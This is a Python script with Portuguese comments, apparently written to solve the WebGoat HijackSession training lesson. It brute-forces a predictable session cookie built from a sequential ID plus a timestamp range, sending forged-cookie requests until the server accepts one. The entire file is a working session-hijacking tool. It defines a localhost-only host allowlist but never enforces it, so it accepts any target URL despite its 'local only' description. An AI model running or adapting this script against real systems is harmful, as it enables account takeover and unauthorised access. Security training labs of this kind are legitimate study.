#!/usr/bin/env python3
"""
hijack.py — WebGoat HijackSession helper

Exemplo:

python3 hijack.py \
  --url "http://127.0.0.1:8080/WebGoat/HijackSession/login" \
  --method POST \
  --jsessionid "SEU_JSESSIONID" \
  --cookie-id 2450061455950621913 \
  --start 1787930611152 \
  --end 1787930713011 \
  --data "username=ubuntu123&password=ubuntu123" \
  --delay 0 \
  --progress 1000
"""

import argparse
import json
import sys
import time
from urllib.parse import urlparse, parse_qsl

import requests


ALLOWED_HOSTS = {"127.0.0.1", "localhost"}



def parse_form_data(raw: str) -> dict:
    if not raw:
        return {}

    return dict(parse_qsl(raw, keep_blank_values=True))


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Testa candidatos de hijack_cookie exclusivamente "
            "em um WebGoat local."
        )
    )

    parser.add_argument(
        "--url",
        required=True,
        help="URL exata do endpoint da lição"
    )

    parser.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="POST",
        help="Método HTTP (padrão: POST)"
    )

    parser.add_argument(
        "--jsessionid",
        required=True,
        help="JSESSIONID atual da sua sessão WebGoat"
    )

    parser.add_argument(
        "--cookie-id",
        required=True,
        type=int,
        help="Parte sequencial do hijack_cookie"
    )

    parser.add_argument(
        "--start",
        required=True,
        type=int,
        help="Primeiro timestamp do intervalo"
    )

    parser.add_argument(
        "--end",
        required=True,
        type=int,
        help="Último timestamp do intervalo"
    )

    parser.add_argument(
        "--data",
        default="",
        help="Dados de formulário, ex.: username=a&password=b"
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.01,
        help="Pausa entre requisições em segundos (padrão: 0.01)"
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=5.0,
        help="Timeout por requisição em segundos (padrão: 5)"
    )

    parser.add_argument(
        "--progress",
        type=int,
        default=1000,
        help="Mostrar progresso a cada N tentativas"
    )

    return parser


def extract_json(response: requests.Response):
    try:
        return response.json()
    except ValueError:
        return None


def is_success(response: requests.Response) -> bool:
    """
    Considera sucesso somente quando a resposta JSON do WebGoat
    contém lessonCompleted=true.
    """
    data = extract_json(response)

    if not isinstance(data, dict):
        return False

    return data.get("lessonCompleted") is True


def main() -> int:
    args = build_parser().parse_args()


    if args.start > args.end:
        raise SystemExit("Erro: --start deve ser menor ou igual a --end")

    if args.delay < 0:
        raise SystemExit("Erro: --delay não pode ser negativo")

    if args.timeout <= 0:
        raise SystemExit("Erro: --timeout deve ser maior que zero")

    form_data = parse_form_data(args.data)

    session = requests.Session()

    # Headers compatíveis com a requisição AJAX da lição.
    session.headers.update({
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://127.0.0.1:8080",
        "Referer": "http://127.0.0.1:8080/WebGoat/",
        "User-Agent": "WebGoat-Local-Lab/1.0",
    })

    total = args.end - args.start + 1

    print(f"[+] Alvo local: {args.url}")
    print(f"[+] Método: {args.method}")
    print(f"[+] cookie-id: {args.cookie_id}")
    print(f"[+] Intervalo: {args.start} .. {args.end} ({total} candidatos)")
    print("[+] Critério de sucesso: lessonCompleted == true")
    print("[+] Redirecionamentos externos estão desativados.")
    print()

    baseline_status = None
    baseline_length = None

    for index, timestamp in enumerate(
        range(args.start, args.end + 1),
        start=1
    ):
        hijack_value = f"{args.cookie_id}-{timestamp}"

        cookies = {
            "JSESSIONID": args.jsessionid,
            "hijack_cookie": hijack_value,
        }

        try:
            if args.method == "POST":
                response = session.post(
                    args.url,
                    cookies=cookies,
                    data=form_data,
                    timeout=args.timeout,
                    allow_redirects=False,
                )
            else:
                response = session.get(
                    args.url,
                    cookies=cookies,
                    params=form_data,
                    timeout=args.timeout,
                    allow_redirects=False,
                )

        except requests.RequestException as exc:
            print(f"[!] Erro em {hijack_value}: {exc}")
            continue

        if is_success(response):
            print()
            print("[+] SUCESSO!")
            print(f"    hijack_cookie={hijack_value}")
            print(f"    HTTP {response.status_code}")

            parsed = extract_json(response)

            if parsed is not None:
                print("    Resposta JSON:")
                print(json.dumps(parsed, indent=2, ensure_ascii=False))
            else:
                print(f"    Resposta: {response.text[:500]}")

            return 0

        # Guarda uma linha de base apenas para diagnóstico.
        if baseline_status is None:
            baseline_status = response.status_code
            baseline_length = len(response.content)

        # Não interrompe em respostas diferentes; apenas avisa.
        current_length = len(response.content)

        if (
            response.status_code != baseline_status
            or abs(current_length - baseline_length) > 100
        ):
            print(
                f"[?] Resposta diferente | "
                f"cookie={hijack_value} | "
                f"HTTP {response.status_code} | "
                f"{current_length} bytes"
            )

        if args.progress > 0 and index % args.progress == 0:
            print(
                f"[*] {index}/{total} testados | "
                f"último={hijack_value} | "
                f"HTTP {response.status_code}"
            )

        if args.delay > 0:
            time.sleep(args.delay)

    print()
    print("[-] Intervalo concluído sem lessonCompleted=true.")
    print("    Confirme:")
    print("    - JSESSIONID atual")
    print("    - cookie-id")
    print("    - intervalo de timestamps")
    print("    - URL/método/payload da requisição")

    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário.")
        sys.exit(130)
